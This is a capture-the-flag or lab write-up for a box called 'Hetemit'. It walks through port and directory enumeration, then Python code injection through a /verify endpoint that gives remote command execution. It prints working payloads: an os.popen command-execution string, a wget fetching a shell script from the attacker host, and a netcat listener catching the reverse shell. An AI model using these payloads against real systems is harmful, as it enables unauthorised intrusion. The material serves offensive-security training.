# 🐧Hetemit



# Enumeration
Nmap
```
(ming㉿kali)-[~/Downloads]
└─$ nmap -p- -T4 -sV 192.168.129.117

Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 17:31 AEDT
Nmap scan report for 192.168.129.117
Host is up (0.24s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.37 ((centos))
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
18000/tcp open  biimenu?
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
```

Found port 50000 running http with python  
Then Gobuster to find subdirectory and got /verfiy
```
┌──(ming㉿kali)-[~/Downloads]
└─$ gobuster dir -u http://192.168.129.117:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.129.117:50000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/verify               (Status: 200) [Size: 8]
```

Use curl to get more info and the website looks running python code
```
┌──(ming㉿kali)-[~/Downloads]
└─$ curl -i http://192.168.129.117:50000/verify
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 8
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Fri, 30 Jan 2026 10:10:42 GMT

{'code'}                                                                                                                  
```

verify it with a simple math and it works
```
The web looks running the code with python   
┌──(ming㉿kali)-[~/Downloads]
└─$ curl -i http://192.168.129.117:50000/verify -X POST -d "code=5*5"                                    
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Fri, 30 Jan 2026 10:07:12 GMT

25
```                                  
# Initial foothold  

Use python code to execute command whoami to confirm we have RCE

```
Use python code to execute command whoami to confirm we have RCE
$ curl -i http://192.168.129.117:50000/verify -X POST -d "code=__import__('os').popen('whoami').read()"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 7
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Fri, 30 Jan 2026 10:20:19 GMT

cmeeks
```
Upload a reverse shell
```
$ curl -i http://192.168.129.117:50000/verify -X POST -d "code=__import__('os').popen('wget http://192.168.45.167/shell.sh -O shell.sh').read()"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 0
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Fri, 30 Jan 2026 10:23:32 GMT
```
Got reverse shell back
```
┌──(ming㉿kali)-[~/Downloads]
└─$ nc -lvnp 21
listening on [any] 21 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.129.117] 36674
sh: cannot set terminal process group (1392): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ whoami
whoami
cmeeks
sh-4.4$ 
```
